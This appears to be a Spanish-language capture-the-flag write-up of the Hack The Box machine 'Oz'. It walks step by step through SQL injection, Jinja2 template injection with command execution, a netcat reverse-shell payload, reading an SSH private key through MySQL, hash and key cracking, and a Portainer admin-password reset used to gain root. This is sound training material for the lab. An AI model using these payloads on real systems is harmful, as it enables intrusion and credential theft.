---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Oz                 |
| Os                     | Linux              |
| Difficulty             | Hard               |
| Points                 | 0                  |
| IP                     | 10.10.10.96        |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Oz/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.96
```

![nmap 1](/assets/images/Oz/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.96 -oG allPorts
```

![nmap2](/assets/images/Oz/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p80,8080 10.10.10.96 -oN targeted
```

![nmap3](/assets/images/Oz/nmap3.png)

Continuemos enumerando informacion de los sitios con whatweb. A simple viste la pagina en puerto 80 pide la autenticacion de un usuario y la de puerto 8080 te hace el login.

![whatweb](/assets/images/Oz/whatweb.png)

Vamos ahora a aplicar Fuzzing sobre la aplicacion de API.

```s
wfuzz -c -t 200 --hw=1,4 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.96/FUZZ
```

Vemos que en la ruta /users la comilla simple genera un error, por lo que podria significar que se puede aplicar un sqli.

![SQLI](/assets/images/Oz/sqli1.png)

Metemos el tipico or 1=1 -- - y si nos devuelve hasta un usuario. Ahora para poder enumerar mas usuarios podemos meter un or 1=1 limit 1,1. Podemos ahora insertar un usuario de la siguiente manera:

```sql
union select database() -- -
union select schema_name from information_schema.schemata limit 0,1; -- -
union select table_name from information_schema.tables where table_schema="ozdb" -- -
union select group_concat(column_name) from information_schema.columns where table_schema="ozdb" and table_name="users_gbw" -- -
```

|   #   |     Database       |     
|:------|:-------------------|
| 0     | information_schema |
| 1     |    mysql           |
| 2     |    ozdb            | 
| 3     | performance_schema |

|   #   |     Tables ozdb    |     
|:------|:-------------------|
| 0     | tickets_gbw        |
| 1     |    users_gbw       |

|   #   |  Table users_gbw   |     
|:------|:-------------------|
| 0     |   id               |
| 1     |   username         |
| 2     |   password         |

Para iterar los usuarios

```bash
for i in $(seq 0 5); do curl -s -X GET "http://10.10.10.96/users/'or%201=1%20limit%20$i,1%20--%20-"; done | jq
```

![database name](/assets/images/Oz/database_name.png)

```s
curl -s -X GET "http://10.10.10.96/users/'union%20select%20group_concat(username,%22:%22,password)%20from%20ozdb.users_gbw--%20-" | jq
```

Para crackear los hashes encontrados:

```s
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
#Si tenemos tarjeta grafica
hashcat -m 10900 -a 0 rockyou.txt --user
#wizard.oz  wizardofoz22
```

Ahora podemos entrar al panel del puerto 8080 con la contrasena encontrada.

Abriremos burpsuite para empezar a hacer pruebas con este formulario tickets e intentar un SSTI.

![Burp 1](/assets/images/Oz/response_test.png)

Como vemos que la respuesta de nuestra prueba se refleja tal cual lo escribimos, es posible hacer un ssti, tambien sabemos que el motor que usa es flask de python y por lo tanto podremos enumerar posibles cosas.

De acuerdo con maquinas anteriores que habiamos hecho, podemos intentar pasarle a la peticion una prueba para que interprete. Para mas informacion, en el siguiente<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---basic-injection"> link.</a>
```py
{{%7*7%}}
```
![Burp 2](/assets/images/Oz/burp2.png)

Ahora podemos intentar insertar comandos con un:
```py
{% raw %}
{{%% get_flashed_messages.__globals__.__builtins__.__import__("os")["popen"]("cat /proc/net/fib_trie").read() %}}
```
Ahora que ya sabemos que usaurio somos, y somos root, procedimos a meter un ifconfig y como no vemos la ip de la maquina objetivo significa que estamos en un docker.

Podemos ver ahora los puertos expuestos realmente con un
```py
{% raw %}
{%{ get_flashed_messages.__globals__.__builtins__.__import__("os")["popen"]("cat /proc/net/tcp").read() %}}
```
La respuesta de los puertos estara en hexadecimal y para verlos hacemos un:

```bash
echo "8C65
1F90
E412" | while read port; do echo "[+] Puerto $port -> $((0x$port))"; done
```

Ahora lo que intentaremos es inyectar un archivo malicioso con el script:
```py
{% raw %}
{{% ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') %}} {{% config.from_pyfile('/tmp/evilconfig.cfg') %}} {{% config['RUNCMD']('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.14.29 443 >/tmp/f',shell=True) %}}
```

Vemos que en la ruta /containers/database hay credenciales para quizas otro contenedor

![Database creds](/assets/images/Oz/database_creds.png)

Dentro de este contenedor, existe una ruta en el /.secret, dentro de este directorio vemos un archivo de configuracion del knock el cual sirve para establecer politicas. Hay una linea para abrir o cerrar el Openssh de acuerdo al portknocking, y para forzarlo haremos el siguiente comando:

```s
for port in 40809 50212 46969; do echo "test" | nc -u -w 1 10.10.10.96 $port; done; ssh dorth@10.10.10.96
```

No funciono, asi que ahora podemos tambien listar las demas maquinas que tenemos enfrente con:

```s
for i in $(seq 1 254); do (ping -c 1 10.100.10.$i | grep "bytes from"&); done
```

Y para detectarles sus puertos, podemos lanzar un:

```s
for port in $(seq 1 65535); do (nc -nvz 10.100.10.4 $port); done
```

Como el unico puerto que tiene abierto es el de mysql, procedemos a conectarnos al servicio con las credenciales antes encontradas:

```s
mysql -uroot -pSuP3rS3cr3tP@ss -h 10.100.10.4 -e 'show databases'
mysql -uroot -pSuP3rS3cr3tP@ss -h 10.100.10.4 -e 'select load_file("/home/dorthi/.ssh/id_rsa")' | sed 's/\\n/\n/g'
```

Como tenemos ahora un id_rsa podemos volver a intentar ahora si

```s
for port in 40809 50212 46969; do echo "test" | nc -u -w 1 10.10.10.96 $port; done; ssh -i id_rsa dorthi@10.10.10.96
```

Este id_rsa esta cifrado, asi que ahora para romper el cifrado podemos usar:

```s
ssh2john id_rsa > data
```

Ahora que tenemos un formato descifrable, usamos el siguiente comando, con las contrasenas encontradas para ver cual es la que sirve para esta clave:

```s
john --wordlist=pass data
#N0Pl4c3L1keH0me
```

Ahora tenemos acceso a la flag y para escalar privilegios, existe un contenedor que es para gestionar los contenedores en el puerto 9000, para usarlo solo usaremos:

```s
for port in 40809 50212 46969; do echo "test" | nc -u -w 1 10.10.10.96 $port; done; ssh -i id_rsa dorthi@10.10.10.96 -L 9000:172.17.0.2:9000
```

Ahora podemos visitar el portainer desde nuestro navegador con un localhost:9000, para esta version de portainer, la contrasena de admin se puede cambiar multiples veces con la siguiente peticion:

```s
curl -s -X POST "http://localhost:9000/api/users/admin/init" -H "Content-Type: application/json" -d '{"password": "rebick"}'
```

Ahora que tenemos acceso a esta interfaz, nos crearemos un contenedor con las siguientes caracteristicas para poder escribir sobre root.

![Container create](/assets/images/Oz/container_create.png)

Ahora solo tenemos que iniciar desde esta interfaz una shell con los privilegios que inicialmente nos da que son de root y dentro de rootfs tenemos el verdadero sistema operativo.

![root](/assets/images/Oz/root.png)

![Powned](/assets/images/Oz/powned.png)